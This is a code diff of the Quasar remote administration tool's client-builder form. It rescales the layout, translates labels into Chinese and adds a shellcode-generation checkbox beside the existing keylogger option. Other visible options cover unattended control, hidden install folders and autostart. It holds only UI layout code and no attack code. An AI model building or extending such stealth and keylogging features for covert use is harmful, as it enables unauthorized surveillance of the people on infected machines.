@@ -125,6 +125,7 @@ namespace Quasar.Server.Forms
             this.line10 = new Quasar.Server.Controls.Line();
             this.label14 = new System.Windows.Forms.Label();
             this.chkKeylogger = new System.Windows.Forms.CheckBox();
+            this.chkGenerateShellcode = new System.Windows.Forms.CheckBox();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC2)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC1)).BeginInit();
             this.contextMenuStrip.SuspendLayout();
@@ -141,18 +142,20 @@ namespace Quasar.Server.Forms
             // 
             // btnBuild
             // 
-            this.btnBuild.Location = new System.Drawing.Point(402, 390);
+            this.btnBuild.Location = new System.Drawing.Point(804, 780);
+            this.btnBuild.Margin = new System.Windows.Forms.Padding(6);
             this.btnBuild.Name = "btnBuild";
-            this.btnBuild.Size = new System.Drawing.Size(121, 23);
+            this.btnBuild.Size = new System.Drawing.Size(242, 46);
             this.btnBuild.TabIndex = 1;
-            this.btnBuild.Text = "Build Client";
+            this.btnBuild.Text = "生成客户端";
             this.btnBuild.UseVisualStyleBackColor = true;
             this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);
             // 
             // picUAC2
             // 
             this.picUAC2.Image = global::Quasar.Server.Properties.Resources.uac_shield;
-            this.picUAC2.Location = new System.Drawing.Point(363, 88);
+            this.picUAC2.Location = new System.Drawing.Point(726, 176);
+            this.picUAC2.Margin = new System.Windows.Forms.Padding(6);
             this.picUAC2.Name = "picUAC2";
             this.picUAC2.Size = new System.Drawing.Size(16, 20);
             this.picUAC2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
@@ -163,7 +166,8 @@ namespace Quasar.Server.Forms
             // picUAC1
             // 
             this.picUAC1.Image = global::Quasar.Server.Properties.Resources.uac_shield;
-            this.picUAC1.Location = new System.Drawing.Point(363, 68);
+            this.picUAC1.Location = new System.Drawing.Point(726, 136);
+            this.picUAC1.Margin = new System.Windows.Forms.Padding(6);
             this.picUAC1.Name = "picUAC1";
             this.picUAC1.Size = new System.Drawing.Size(16, 20);
             this.picUAC1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
@@ -174,9 +178,10 @@ namespace Quasar.Server.Forms
             // rbSystem
             // 
             this.rbSystem.AutoSize = true;
-            this.rbSystem.Location = new System.Drawing.Point(241, 91);
+            this.rbSystem.Location = new System.Drawing.Point(482, 182);
+            this.rbSystem.Margin = new System.Windows.Forms.Padding(6);
             this.rbSystem.Name = "rbSystem";
-            this.rbSystem.Size = new System.Drawing.Size(60, 17);
+            this.rbSystem.Size = new System.Drawing.Size(113, 34);
             this.rbSystem.TabIndex = 5;
             this.rbSystem.TabStop = true;
             this.rbSystem.Text = "System";
@@ -187,9 +192,10 @@ namespace Quasar.Server.Forms
             // rbProgramFiles
             // 
             this.rbProgramFiles.AutoSize = true;
-            this.rbProgramFiles.Location = new System.Drawing.Point(241, 68);
+            this.rbProgramFiles.Location = new System.Drawing.Point(482, 136);
+            this.rbProgramFiles.Margin = new System.Windows.Forms.Padding(6);
             this.rbProgramFiles.Name = "rbProgramFiles";
-            this.rbProgramFiles.Size = new System.Drawing.Size(94, 17);
+            this.rbProgramFiles.Size = new System.Drawing.Size(176, 34);
             this.rbProgramFiles.TabIndex = 4;
             this.rbProgramFiles.TabStop = true;
             this.rbProgramFiles.Text = "Program Files";
@@ -199,17 +205,18 @@ namespace Quasar.Server.Forms
             // 
             // contextMenuStrip
             // 
+            this.contextMenuStrip.ImageScalingSize = new System.Drawing.Size(32, 32);
             this.contextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.removeHostToolStripMenuItem,
             this.clearToolStripMenuItem});
             this.contextMenuStrip.Name = "ctxtMenuHosts";
-            this.contextMenuStrip.Size = new System.Drawing.Size(144, 48);
+            this.contextMenuStrip.Size = new System.Drawing.Size(256, 84);
             // 
             // removeHostToolStripMenuItem
             // 
             this.removeHostToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.delete;
             this.removeHostToolStripMenuItem.Name = "removeHostToolStripMenuItem";
-            this.removeHostToolStripMenuItem.Size = new System.Drawing.Size(143, 22);
+            this.removeHostToolStripMenuItem.Size = new System.Drawing.Size(255, 40);
             this.removeHostToolStripMenuItem.Text = "Remove host";
             this.removeHostToolStripMenuItem.Click += new System.EventHandler(this.removeHostToolStripMenuItem_Click);
             // 
@@ -217,7 +224,7 @@ namespace Quasar.Server.Forms
             // 
             this.clearToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.broom;
             this.clearToolStripMenuItem.Name = "clearToolStripMenuItem";
-            this.clearToolStripMenuItem.Size = new System.Drawing.Size(143, 22);
+            this.clearToolStripMenuItem.Size = new System.Drawing.Size(255, 40);
             this.clearToolStripMenuItem.Text = "Clear all";
             this.clearToolStripMenuItem.Click += new System.EventHandler(this.clearToolStripMenuItem_Click);
             // 
@@ -232,10 +239,11 @@ namespace Quasar.Server.Forms
             this.builderTabs.Dock = System.Windows.Forms.DockStyle.Top;
             this.builderTabs.ItemSize = new System.Drawing.Size(44, 136);
             this.builderTabs.Location = new System.Drawing.Point(0, 0);
+            this.builderTabs.Margin = new System.Windows.Forms.Padding(6);
             this.builderTabs.Multiline = true;
             this.builderTabs.Name = "builderTabs";
             this.builderTabs.SelectedIndex = 0;
-            this.builderTabs.Size = new System.Drawing.Size(535, 384);
+            this.builderTabs.Size = new System.Drawing.Size(1070, 768);
             this.builderTabs.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
             this.builderTabs.TabIndex = 0;
             // 
@@ -258,150 +266,164 @@ namespace Quasar.Server.Forms
             this.generalPage.Controls.Add(this.lblMutex);
             this.generalPage.Controls.Add(this.label6);
             this.generalPage.Location = new System.Drawing.Point(140, 4);
+            this.generalPage.Margin = new System.Windows.Forms.Padding(6);
             this.generalPage.Name = "generalPage";
-            this.generalPage.Padding = new System.Windows.Forms.Padding(3);
-            this.generalPage.Size = new System.Drawing.Size(391, 376);
+            this.generalPage.Padding = new System.Windows.Forms.Padding(6);
+            this.generalPage.Size = new System.Drawing.Size(926, 760);
             this.generalPage.TabIndex = 4;
-            this.generalPage.Text = "Basic Settings";
+            this.generalPage.Text = "基本设置";
             // 
             // label3
             // 
             this.label3.AutoSize = true;
-            this.label3.Location = new System.Drawing.Point(17, 214);
+            this.label3.Location = new System.Drawing.Point(34, 428);
+            this.label3.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.label3.Name = "label3";
-            this.label3.Size = new System.Drawing.Size(354, 26);
+            this.label3.Size = new System.Drawing.Size(588, 30);
             this.label3.TabIndex = 24;
-            this.label3.Text = "Activating the unattended mode allows remote control of the client\r\nwithout user " +
-    "interaction.";
+            this.label3.Text = "激活无人值守模式允许远程控制客户端而无需用户交互。";
             // 
             // chkUnattendedMode
             // 
             this.chkUnattendedMode.AutoSize = true;
-            this.chkUnattendedMode.Location = new System.Drawing.Point(20, 252);
+            this.chkUnattendedMode.Location = new System.Drawing.Point(40, 504);
+            this.chkUnattendedMode.Margin = new System.Windows.Forms.Padding(6);
             this.chkUnattendedMode.Name = "chkUnattendedMode";
-            this.chkUnattendedMode.Size = new System.Drawing.Size(157, 17);
+            this.chkUnattendedMode.Size = new System.Drawing.Size(229, 34);
             this.chkUnattendedMode.TabIndex = 23;
-            this.chkUnattendedMode.Text = "Enable unattended mode";
+            this.chkUnattendedMode.Text = "启用无人值守模式";
             this.chkUnattendedMode.UseVisualStyleBackColor = true;
             this.chkUnattendedMode.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // line2
             // 
             this.line2.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
-            this.line2.Location = new System.Drawing.Point(115, 196);
+            this.line2.Location = new System.Drawing.Point(230, 392);
+            this.line2.Margin = new System.Windows.Forms.Padding(6);
             this.line2.Name = "line2";
-            this.line2.Size = new System.Drawing.Size(270, 13);
+            this.line2.Size = new System.Drawing.Size(540, 26);
             this.line2.TabIndex = 22;
             this.line2.TabStop = false;
             // 
             // label2
             // 
             this.label2.AutoSize = true;
-            this.label2.Location = new System.Drawing.Point(8, 196);
+            this.label2.Location = new System.Drawing.Point(16, 392);
+            this.label2.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.label2.Name = "label2";
-            this.label2.Size = new System.Drawing.Size(101, 13);
+            this.label2.Size = new System.Drawing.Size(151, 30);
             this.label2.TabIndex = 21;
-            this.label2.Text = "Unattended mode";
+            this.label2.Text = "无人值守模式";
             // 
             // label9
             // 
             this.label9.AutoSize = true;
-            this.label9.Location = new System.Drawing.Point(17, 94);
+            this.label9.Location = new System.Drawing.Point(34, 188);
+            this.label9.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.label9.Name = "label9";
-            this.label9.Size = new System.Drawing.Size(370, 26);
+            this.label9.Size = new System.Drawing.Size(634, 30);
             this.label9.TabIndex = 5;
-            this.label9.Text = "A unique mutex ensures that only one instance of the client is running\r\non the sa" +
-    "me system.";
+            this.label9.Text = "唯一的互斥可确保只有一个客户端实例在运行在同一系统上。";
             // 
             // line6
             // 
             this.line6.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
-            this.line6.Location = new System.Drawing.Point(85, 78);
+            this.line6.Location = new System.Drawing.Point(170, 156);
+            this.line6.Margin = new System.Windows.Forms.Padding(6);
             this.line6.Name = "line6";
-            this.line6.Size = new System.Drawing.Size(300, 13);
+            this.line6.Size = new System.Drawing.Size(600, 26);
             this.line6.TabIndex = 20;
             this.line6.TabStop = false;
             // 
             // label8
             // 
             this.label8.AutoSize = true;
-            this.label8.Location = new System.Drawing.Point(6, 78);
+            this.label8.Location = new System.Drawing.Point(12, 156);
+            this.label8.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.label8.Name = "label8";
-            this.label8.Size = new System.Drawing.Size(80, 13);
+            this.label8.Size = new System.Drawing.Size(105, 30);
             this.label8.TabIndex = 4;
-            this.label8.Text = "Process Mutex";
+            this.label8.Text = "进程互斥";
             // 
             // txtTag
             // 
-            this.txtTag.Location = new System.Drawing.Point(130, 40);
+            this.txtTag.Location = new System.Drawing.Point(260, 80);
+            this.txtTag.Margin = new System.Windows.Forms.Padding(6);
             this.txtTag.Name = "txtTag";
-            this.txtTag.Size = new System.Drawing.Size(255, 22);
+            this.txtTag.Size = new System.Drawing.Size(506, 37);
             this.txtTag.TabIndex = 3;
             this.txtTag.TextChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // label7
             // 
             this.label7.AutoSize = true;
-            this.label7.Location = new System.Drawing.Point(17, 20);
+            this.label7.Location = new System.Drawing.Point(34, 40);
+            this.label7.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.label7.Name = "label7";
-            this.label7.Size = new System.Drawing.Size(231, 13);
+            this.label7.Size = new System.Drawing.Size(427, 30);
             this.label7.TabIndex = 1;
-            this.label7.Text = "You can choose a tag to identify your client.";
+            this.label7.Text = "您可以选择一个标记来识别您的客户端。";
             // 
             // lblTag
             // 
             this.lblTag.AutoSize = true;
-            this.lblTag.Location = new System.Drawing.Point(17, 43);
+            this.lblTag.Location = new System.Drawing.Point(34, 86);
+            this.lblTag.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblTag.Name = "lblTag";
-            this.lblTag.Size = new System.Drawing.Size(61, 13);
+            this.lblTag.Size = new System.Drawing.Size(151, 30);
             this.lblTag.TabIndex = 2;
-            this.lblTag.Text = "Client Tag:";
+            this.lblTag.Text = "客户端标记：";
             // 
             // txtMutex
             // 
-            this.txtMutex.Location = new System.Drawing.Point(130, 130);
+            this.txtMutex.Location = new System.Drawing.Point(260, 260);
+            this.txtMutex.Margin = new System.Windows.Forms.Padding(6);
             this.txtMutex.MaxLength = 64;
             this.txtMutex.Name = "txtMutex";
-            this.txtMutex.Size = new System.Drawing.Size(253, 22);
+            this.txtMutex.Size = new System.Drawing.Size(502, 37);
             this.txtMutex.TabIndex = 7;
             this.txtMutex.TextChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // btnMutex
             // 
-            this.btnMutex.Location = new System.Drawing.Point(262, 158);
+            this.btnMutex.Location = new System.Drawing.Point(524, 316);
+            this.btnMutex.Margin = new System.Windows.Forms.Padding(6);
             this.btnMutex.Name = "btnMutex";
-            this.btnMutex.Size = new System.Drawing.Size(121, 23);
+            this.btnMutex.Size = new System.Drawing.Size(242, 46);
             this.btnMutex.TabIndex = 8;
-            this.btnMutex.Text = "Random Mutex";
+            this.btnMutex.Text = "随机互斥体";
             this.btnMutex.UseVisualStyleBackColor = true;
             this.btnMutex.Click += new System.EventHandler(this.btnMutex_Click);
             // 
             // line5
             // 
             this.line5.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
-            this.line5.Location = new System.Drawing.Point(112, 5);
+            this.line5.Location = new System.Drawing.Point(224, 10);
+            this.line5.Margin = new System.Windows.Forms.Padding(6);
             this.line5.Name = "line5";
-            this.line5.Size = new System.Drawing.Size(271, 13);
+            this.line5.Size = new System.Drawing.Size(542, 26);
             this.line5.TabIndex = 15;
             this.line5.TabStop = false;
             // 
             // lblMutex
             // 
             this.lblMutex.AutoSize = true;
-            this.lblMutex.Location = new System.Drawing.Point(17, 133);
+            this.lblMutex.Location = new System.Drawing.Point(34, 266);
+            this.lblMutex.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblMutex.Name = "lblMutex";
-            this.lblMutex.Size = new System.Drawing.Size(42, 13);
+            this.lblMutex.Size = new System.Drawing.Size(105, 30);
             this.lblMutex.TabIndex = 6;
-            this.lblMutex.Text = "Mutex:";
+            this.lblMutex.Text = "互斥体：";
             // 
             // label6
             // 
             this.label6.AutoSize = true;
-            this.label6.Location = new System.Drawing.Point(6, 5);
+            this.label6.Location = new System.Drawing.Point(12, 10);
+            this.label6.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.label6.Name = "label6";
-            this.label6.Size = new System.Drawing.Size(109, 13);
+            this.label6.Size = new System.Drawing.Size(128, 30);
             this.label6.TabIndex = 0;
-            this.label6.Text = "Client Identification";
+            this.label6.Text = "客户端标识";
             // 
             // connectionPage
             // 
@@ -420,15 +442,17 @@ namespace Quasar.Server.Forms
             this.connectionPage.Controls.Add(this.lblDelay);
             this.connectionPage.Controls.Add(this.lblPort);
             this.connectionPage.Location = new System.Drawing.Point(140, 4);
+            this.connectionPage.Margin = new System.Windows.Forms.Padding(6);
             this.connectionPage.Name = "connectionPage";
-            this.connectionPage.Padding = new System.Windows.Forms.Padding(3);
-            this.connectionPage.Size = new System.Drawing.Size(391, 376);
+            this.connectionPage.Padding = new System.Windows.Forms.Padding(6);
+            this.connectionPage.Size = new System.Drawing.Size(926, 760);
             this.connectionPage.TabIndex = 0;
-            this.connectionPage.Text = "Connection Settings";
+            this.connectionPage.Text = "链接设置";
             // 
             // numericUpDownPort
             // 
-            this.numericUpDownPort.Location = new System.Drawing.Point(254, 51);
+            this.numericUpDownPort.Location = new System.Drawing.Point(508, 102);
+            this.numericUpDownPort.Margin = new System.Windows.Forms.Padding(6);
             this.numericUpDownPort.Maximum = new decimal(new int[] {
             65535,
             0,
@@ -440,7 +464,7 @@ namespace Quasar.Server.Forms
             0,
             0});
             this.numericUpDownPort.Name = "numericUpDownPort";
-            this.numericUpDownPort.Size = new System.Drawing.Size(129, 22);
+            this.numericUpDownPort.Size = new System.Drawing.Size(258, 37);
             this.numericUpDownPort.TabIndex = 3;
             this.numericUpDownPort.Value = new decimal(new int[] {
             1,
@@ -450,14 +474,15 @@ namespace Quasar.Server.Forms
             // 
             // numericUpDownDelay
             // 
-            this.numericUpDownDelay.Location = new System.Drawing.Point(276, 178);
+            this.numericUpDownDelay.Location = new System.Drawing.Point(552, 356);
+            this.numericUpDownDelay.Margin = new System.Windows.Forms.Padding(6);
             this.numericUpDownDelay.Maximum = new decimal(new int[] {
             600000,
             0,
             0,
             0});
             this.numericUpDownDelay.Name = "numericUpDownDelay";
-            this.numericUpDownDelay.Size = new System.Drawing.Size(80, 22);
+            this.numericUpDownDelay.Size = new System.Drawing.Size(160, 37);
             this.numericUpDownDelay.TabIndex = 10;
             this.numericUpDownDelay.Value = new decimal(new int[] {
             5000,
@@ -469,101 +494,113 @@ namespace Quasar.Server.Forms
             // line3
             // 
             this.line3.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
-            this.line3.Location = new System.Drawing.Point(95, 159);
+            this.line3.Location = new System.Drawing.Point(190, 318);
+            this.line3.Margin = new System.Windows.Forms.Padding(6);
             this.line3.Name = "line3";
-            this.line3.Size = new System.Drawing.Size(290, 13);
+            this.line3.Size = new System.Drawing.Size(580, 26);
             this.line3.TabIndex = 18;
             this.line3.TabStop = false;
             // 
             // label4
             // 
             this.label4.AutoSize = true;
-            this.label4.Location = new System.Drawing.Point(6, 159);
+            this.label4.Location = new System.Drawing.Point(12, 318);
+            this.label4.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.label4.Name = "label4";
-            this.label4.Size = new System.Drawing.Size(92, 13);
+            this.label4.Size = new System.Drawing.Size(151, 30);
             this.label4.TabIndex = 17;
-            this.label4.Text = "Reconnect Delay";
+            this.label4.Text = "重新连接延迟";
             // 
             // line1
             // 
             this.line1.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
-            this.line1.Location = new System.Drawing.Point(104, 5);
+            this.line1.Location = new System.Drawing.Point(208, 10);
+            this.line1.Margin = new System.Windows.Forms.Padding(6);
             this.line1.Name = "line1";
-            this.line1.Size = new System.Drawing.Size(281, 13);
+            this.line1.Size = new System.Drawing.Size(562, 26);
             this.line1.TabIndex = 13;
             this.line1.TabStop = false;
             // 
             // label1
             // 
             this.label1.AutoSize = true;
-            this.label1.Location = new System.Drawing.Point(6, 5);
+            this.label1.Location = new System.Drawing.Point(12, 10);
+            this.label1.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.label1.Name = "label1";
-            this.label1.Size = new System.Drawing.Size(99, 13);
+            this.label1.Size = new System.Drawing.Size(105, 30);
             this.label1.TabIndex = 14;
-            this.label1.Text = "Connection Hosts";
+            this.label1.Text = "连接主机";
             // 
             // lstHosts
             // 
             this.lstHosts.ContextMenuStrip = this.contextMenuStrip;
             this.lstHosts.FormattingEnabled = true;
-            this.lstHosts.Location = new System.Drawing.Point(20, 21);
+            this.lstHosts.ItemHeight = 30;
+            this.lstHosts.Location = new System.Drawing.Point(40, 42);
+            this.lstHosts.Margin = new System.Windows.Forms.Padding(6);
             this.lstHosts.Name = "lstHosts";
-            this.lstHosts.Size = new System.Drawing.Size(149, 121);
+            this.lstHosts.Size = new System.Drawing.Size(294, 214);
             this.lstHosts.TabIndex = 5;
             this.lstHosts.TabStop = false;
             // 
             // btnAddHost
             // 
-            this.btnAddHost.Location = new System.Drawing.Point(254, 78);
+            this.btnAddHost.Location = new System.Drawing.Point(508, 156);
+            this.btnAddHost.Margin = new System.Windows.Forms.Padding(6);
             this.btnAddHost.Name = "btnAddHost";
-            this.btnAddHost.Size = new System.Drawing.Size(129, 22);
+            this.btnAddHost.Size = new System.Drawing.Size(258, 44);
             this.btnAddHost.TabIndex = 4;
-            this.btnAddHost.Text = "Add Host";
+            this.btnAddHost.Text = "添加主机";
             this.btnAddHost.UseVisualStyleBackColor = true;
             this.btnAddHost.Click += new System.EventHandler(this.btnAddHost_Click);
             // 
             // lblMS
             // 
             this.lblMS.AutoSize = true;
-            this.lblMS.Location = new System.Drawing.Point(356, 183);
+            this.lblMS.Location = new System.Drawing.Point(712, 366);
+            this.lblMS.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblMS.Name = "lblMS";
-            this.lblMS.Size = new System.Drawing.Size(21, 13);
+            this.lblMS.Size = new System.Drawing.Size(41, 30);
             this.lblMS.TabIndex = 11;
             this.lblMS.Text = "ms";
             // 
             // lblHost
             // 
             this.lblHost.AutoSize = true;
-            this.lblHost.Location = new System.Drawing.Point(175, 25);
+            this.lblHost.Location = new System.Drawing.Point(350, 50);
+            this.lblHost.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblHost.Name = "lblHost";
-            this.lblHost.Size = new System.Drawing.Size(75, 13);
+            this.lblHost.Size = new System.Drawing.Size(132, 30);
             this.lblHost.TabIndex = 0;
-            this.lblHost.Text = "IP/Hostname:";
+            this.lblHost.Text = "IP/主机名：";
             // 
             // txtHost
             // 
-            this.txtHost.Location = new System.Drawing.Point(254, 22);
+            this.txtHost.Location = new System.Drawing.Point(508, 44);
+            this.txtHost.Margin = new System.Windows.Forms.Padding(6);
             this.txtHost.Name = "txtHost";
-            this.txtHost.Size = new System.Drawing.Size(129, 22);
+            this.txtHost.Size = new System.Drawing.Size(254, 37);
             this.txtHost.TabIndex = 1;
             // 
             // lblDelay
             // 
             this.lblDelay.AutoSize = true;
-            this.lblDelay.Location = new System.Drawing.Point(17, 182);
+            this.lblDelay.Location = new System.Drawing.Point(34, 364);
+            this.lblDelay.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblDelay.Name = "lblDelay";
-            this.lblDelay.Size = new System.Drawing.Size(200, 13);
+            this.lblDelay.Size = new System.Drawing.Size(335, 30);
             this.lblDelay.TabIndex = 9;
-            this.lblDelay.Text = "Time to wait between reconnect tries:";
+            this.lblDelay.Text = "重新连接尝试之间的等待时间：";
             // 
             // lblPort
             // 
             this.lblPort.AutoSize = true;
-            this.lblPort.Location = new System.Drawing.Point(175, 53);
+            this.lblPort.Location = new System.Drawing.Point(350, 106);
+            this.lblPort.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblPort.Name = "lblPort";
-            this.lblPort.Size = new System.Drawing.Size(31, 13);
+            this.lblPort.Size = new System.Drawing.Size(82, 30);
             this.lblPort.TabIndex = 2;
-            this.lblPort.Text = "Port:";
+            this.lblPort.Text = "端口：";
             // 
             // installationPage
             // 
@@ -592,121 +629,134 @@ namespace Quasar.Server.Forms
             this.installationPage.Controls.Add(this.txtInstallSubDirectory);
             this.installationPage.Controls.Add(this.txtPreviewPath);
             this.installationPage.Location = new System.Drawing.Point(140, 4);
+            this.installationPage.Margin = new System.Windows.Forms.Padding(6);
             this.installationPage.Name = "installationPage";
-            this.installationPage.Padding = new System.Windows.Forms.Padding(3);
-            this.installationPage.Size = new System.Drawing.Size(391, 376);
+            this.installationPage.Padding = new System.Windows.Forms.Padding(6);
+            this.installationPage.Size = new System.Drawing.Size(926, 760);
             this.installationPage.TabIndex = 1;
-            this.installationPage.Text = "Installation Settings";
+            this.installationPage.Text = "安装设置";
             // 
             // chkHideSubDirectory
             // 
             this.chkHideSubDirectory.AutoSize = true;
-            this.chkHideSubDirectory.Location = new System.Drawing.Point(186, 185);
+            this.chkHideSubDirectory.Location = new System.Drawing.Point(372, 370);
+            this.chkHideSubDirectory.Margin = new System.Windows.Forms.Padding(6);
             this.chkHideSubDirectory.Name = "chkHideSubDirectory";
-            this.chkHideSubDirectory.Size = new System.Drawing.Size(185, 17);
+            this.chkHideSubDirectory.Size = new System.Drawing.Size(298, 34);
             this.chkHideSubDirectory.TabIndex = 37;
-            this.chkHideSubDirectory.Text = "Set subdir attributes to hidden";
+            this.chkHideSubDirectory.Text = "将子目录属性设置为隐藏";
             this.chkHideSubDirectory.UseVisualStyleBackColor = true;
             // 
             // line7
             // 
             this.line7.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
-            this.line7.Location = new System.Drawing.Point(60, 274);
+            this.line7.Location = new System.Drawing.Point(120, 548);
+            this.line7.Margin = new System.Windows.Forms.Padding(6);
             this.line7.Name = "line7";
-            this.line7.Size = new System.Drawing.Size(323, 13);
+            this.line7.Size = new System.Drawing.Size(646, 26);
             this.line7.TabIndex = 36;
             this.line7.TabStop = false;
             // 
             // label10
             // 
             this.label10.AutoSize = true;
-            this.label10.Location = new System.Drawing.Point(7, 274);
+            this.label10.Location = new System.Drawing.Point(14, 548);
+            this.label10.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.label10.Name = "label10";
-            this.label10.Size = new System.Drawing.Size(55, 13);
+            this.label10.Size = new System.Drawing.Size(105, 30);
             this.label10.TabIndex = 14;
-            this.label10.Text = "Autostart";
+            this.label10.Text = "自动启动";
             // 
             // line4
             // 
             this.line4.LineAlignment = Quasar.Server.Controls.Line.Alignment.Horizontal;
-            this.line4.Location = new System.Drawing.Point(117, 5);
+            this.line4.Location = new System.Drawing.Point(234, 10);
+            this.line4.Margin = new System.Windows.Forms.Padding(6);
             this.line4.Name = "line4";
-            this.line4.Size = new System.Drawing.Size(266, 13);
+            this.line4.Size = new System.Drawing.Size(532, 26);
             this.line4.TabIndex = 34;
             this.line4.TabStop = false;
             // 
             // label5
             // 
             this.label5.AutoSize = true;
-            this.label5.Location = new System.Drawing.Point(6, 5);
+            this.label5.Location = new System.Drawing.Point(12, 10);
+            this.label5.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.label5.Name = "label5";
-            this.label5.Size = new System.Drawing.Size(112, 13);
+            this.label5.Size = new System.Drawing.Size(105, 30);
             this.label5.TabIndex = 0;
-            this.label5.Text = "Installation Location";
+            this.label5.Text = "安装位置";
             // 
             // chkInstall
             // 
             this.chkInstall.AutoSize = true;
-            this.chkInstall.Location = new System.Drawing.Point(20, 21);
+            this.chkInstall.Location = new System.Drawing.Point(40, 42);
+            this.chkInstall.Margin = new System.Windows.Forms.Padding(6);
             this.chkInstall.Name = "chkInstall";
-            this.chkInstall.Size = new System.Drawing.Size(90, 17);
+            this.chkInstall.Size = new System.Drawing.Size(160, 34);
             this.chkInstall.TabIndex = 1;
-            this.chkInstall.Text = "Install Client";
+            this.chkInstall.Text = "安装客户端";
             this.chkInstall.UseVisualStyleBackColor = true;
             this.chkInstall.CheckedChanged += new System.EventHandler(this.chkInstall_CheckedChanged);
             // 
             // lblInstallName
             // 
             this.lblInstallName.AutoSize = true;
-            this.lblInstallName.Location = new System.Drawing.Point(17, 156);
+            this.lblInstallName.Location = new System.Drawing.Point(34, 312);
+            this.lblInstallName.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblInstallName.Name = "lblInstallName";
-            this.lblInstallName.Size = new System.Drawing.Size(73, 13);
+            this.lblInstallName.Size = new System.Drawing.Size(128, 30);
             this.lblInstallName.TabIndex = 8;
-            this.lblInstallName.Text = "Install Name:";
+            this.lblInstallName.Text = "安装名称：";
             // 
             // txtInstallName
             // 
-            this.txtInstallName.Location = new System.Drawing.Point(182, 153);
+            this.txtInstallName.Location = new System.Drawing.Point(364, 306);
+            this.txtInstallName.Margin = new System.Windows.Forms.Padding(6);
             this.txtInstallName.Name = "txtInstallName";
-            this.txtInstallName.Size = new System.Drawing.Size(170, 22);
+            this.txtInstallName.Size = new System.Drawing.Size(336, 37);
             this.txtInstallName.TabIndex = 9;
             this.txtInstallName.TextChanged += new System.EventHandler(this.HasChangedSettingAndFilePath);
             this.txtInstallName.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtInstallname_KeyPress);
             // 
             // txtRegistryKeyName
             // 
-            this.txtRegistryKeyName.Location = new System.Drawing.Point(182, 324);
+            this.txtRegistryKeyName.Location = new System.Drawing.Point(364, 648);
+            this.txtRegistryKeyName.Margin = new System.Windows.Forms.Padding(6);
             this.txtRegistryKeyName.Name = "txtRegistryKeyName";
-            this.txtRegistryKeyName.Size = new System.Drawing.Size(201, 22);
+            this.txtRegistryKeyName.Size = new System.Drawing.Size(398, 37);
             this.txtRegistryKeyName.TabIndex = 17;
             this.txtRegistryKeyName.TextChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // lblExtension
             // 
             this.lblExtension.AutoSize = true;
-            this.lblExtension.Location = new System.Drawing.Point(352, 159);
+            this.lblExtension.Location = new System.Drawing.Point(704, 318);
+            this.lblExtension.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblExtension.Name = "lblExtension";
-            this.lblExtension.Size = new System.Drawing.Size(27, 13);
+            this.lblExtension.Size = new System.Drawing.Size(52, 30);
             this.lblExtension.TabIndex = 10;
             this.lblExtension.Text = ".exe";
             // 
             // lblRegistryKeyName
             // 
             this.lblRegistryKeyName.AutoSize = true;
-            this.lblRegistryKeyName.Location = new System.Drawing.Point(17, 327);
+            this.lblRegistryKeyName.Location = new System.Drawing.Point(34, 654);
+            this.lblRegistryKeyName.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
             this.lblRegistryKeyName.Name = "lblRegistryKeyName";
-            this.lblRegistryKeyName.Size = new System.Drawing.Size(80, 13);
+            this.lblRegistryKeyName.Size = new System.Drawing.Size(128, 30);
             this.lblRegistryKeyName.TabIndex = 16;
-            this.lblRegistryKeyName.Text = "Startup Name:";
+            this.lblRegistryKeyName.Text = "启动名称：";
             // 
             // chkStartup
             // 
             this.chkStartup.AutoSize = true;
-            this.chkStartup.Location = new System.Drawing.Point(20, 298);
+            this.chkStartup.Location = new System.Drawing.Point(40, 596);
+            this.chkStartup.Margin = new System.Windows.Forms.Padding(6);
             this.chkStartup.Name = "chkStartup";
-            this.chkStartup.Size = new System.Drawing.Size(215, 17);
+            this.chkStartup.Size = new System.Drawing.Size(298, 34);
             this.chkStartup.TabIndex = 15;
-            this.chkStartup.Text = "Run Client when the computer starts";
+            this.chkStartup.Text = "计算机启动时运行客户端";
             this.chkStartup.UseVisualStyleBackColor = true;
             this.chkStartup.CheckedChanged += new System.EventHandler(this.chkStartup_CheckedChanged);
             // 
@@ -714,9 +764,10 @@ namespace Quasar.Server.Forms
             // 
             this.rbAppdata.AutoSize = true;
             this.rbAppdata.Checked = true;
-            this.rbAppdata.Location = new System.Drawing.Point(241, 45);
